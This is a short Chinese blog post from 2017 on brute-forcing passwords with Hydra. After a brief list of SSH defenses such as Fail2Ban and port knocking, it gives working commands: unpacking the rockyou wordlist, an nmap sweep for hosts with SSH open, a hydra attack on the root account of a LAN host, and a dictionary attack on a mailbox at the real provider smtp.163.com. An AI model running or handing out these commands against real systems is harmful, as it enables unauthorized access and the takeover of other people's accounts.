---
title: "使用Hydra通过ssh破解密码"
categories: [ "安全" ]
tags: [ "密码安全" ]
draft: false
slug: "使用Hydra通过ssh破解密码-使用hydra通过ssh破解密码"
date: "2017-04-08 08:16:26"
---



Hydra是非常高效的网络登录破解工具，它可以对多种服务程序执行暴力破解（SSH、VNC等等）。

防止这种攻击其实很容易，方法很多。以SSH为例：

  * Ubuntu：使用Port Knocking隐藏SSH端口

  * 在Ubuntu中用Fail2Ban保护SSH

  * CentOS 7安装使用Fail2Ban保护SSH

  * Debian使用Fail2Ban和Tinyhoneypot增加网络安全

  * * * *

Kail Linux有一个的GUI版本：xhydra，也有一个命令行版本：hydra

xhydra：

![][1] 

hydra：

![][2] 

我使用命令行版本：hydra

## 字典

这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz。

    # gzip -d /usr/share/wordlists/rockyou.txt.gz

## 使用nmap扫描开启SSH服务的主机

扫描SSH服务(22端口)，确定可以施行破解的主机。

    ＃ nmap -p 22 -open -sV one_IP_or_range_or_subnet > MyTarget

## 使用hydra暴力破解

    # hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh

## 破解邮箱密码：

    # hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp

更多选项，查看man hydra。

 [1]: /uploads/oss/2017-04-25-14916394435149.png ""
 [2]: /uploads/oss/2017-04-25-14916394572895.png ""